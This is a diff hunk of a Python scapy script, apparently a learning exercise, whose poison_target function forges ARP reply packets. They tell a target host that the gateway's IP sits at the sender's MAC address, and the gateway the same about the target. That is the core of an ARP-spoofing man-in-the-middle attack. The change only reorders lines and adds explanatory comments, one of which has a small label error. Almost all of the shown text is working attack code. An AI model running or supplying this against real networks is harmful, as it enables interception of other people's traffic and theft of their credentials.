@@ -33,13 +33,13 @@ def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
     poison_target.pdst = target_ip #tell to the target ip
     poison_target.hwdst= target_mac #with target_mac
     poison_target.psrc = gateway_ip #that the gateway-ip
-    poison_target.op   = 2 #is-at this mac address.
+    poison_target.op   = 2 #is-at this mac address. (2 is arp reply)
 
     poison_gateway = ARP()
-    poison_gateway.op   = 2
-    poison_gateway.psrc = target_ip
-    poison_gateway.pdst = gateway_ip
-    poison_gateway.hwdst= gateway_mac
+    poison_gateway.pdst = gateway_ip #tell to the gateway ip
+    poison_gateway.hwdst= gateway_mac #with target mak
+    poison_gateway.psrc = target_ip #that the target ip
+    poison_gateway.op   = 2 #is-at this mac address (2 is arp reply)
 
     print "[*] Beginning the ARP poison. [CTRL-C to stop]"
 
